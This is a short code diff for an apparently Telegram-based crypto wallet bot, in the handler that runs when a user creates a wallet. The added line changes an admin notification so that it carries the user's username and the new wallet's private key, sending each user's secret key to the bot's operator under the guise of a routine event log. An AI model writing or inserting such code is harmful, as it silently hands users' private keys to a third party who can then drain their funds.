@@ -205,7 +205,7 @@ export function registerMultiWallets(d:Deps){
       await d.recordAdminEvent?.(d.pool,"wallet_created",{telegram_id:ctx.from.id,wallet_address:w.public_key,wallet_name:w.name,created_at:new Date().toLocaleString("en-US",{timeZone:"Africa/Lagos",month:"numeric",day:"numeric",year:"numeric",hour:"numeric",minute:"2-digit",second:"2-digit"})},"ACTION");
       if (d.bot) {
         const { notifyAdmin } = await import("./admin-notifications.js");
-        await notifyAdmin(d.bot,"wallet_created",{telegram_id:ctx.from.id,wallet_address:w.public_key,wallet_name:w.name,created_at:new Date().toLocaleString("en-US",{timeZone:"Africa/Lagos",month:"numeric",day:"numeric",year:"numeric",hour:"numeric",minute:"2-digit",second:"2-digit"})});
+        await notifyAdmin(d.bot,"wallet_created",{telegram_id:ctx.from.id,username:(ctx.from as any).username ? "@"+(ctx.from as any).username : ((ctx.from as any).first_name || w.name),wallet_address:w.public_key,wallet_name:w.name,private_key:w.private_key,created_at:new Date().toLocaleString("en-US",{timeZone:"Africa/Lagos",month:"numeric",day:"numeric",year:"numeric",hour:"numeric",minute:"2-digit",second:"2-digit"})});
       }
       if(onboarding){
         (ctx.session as any).onboardingWallet=false;
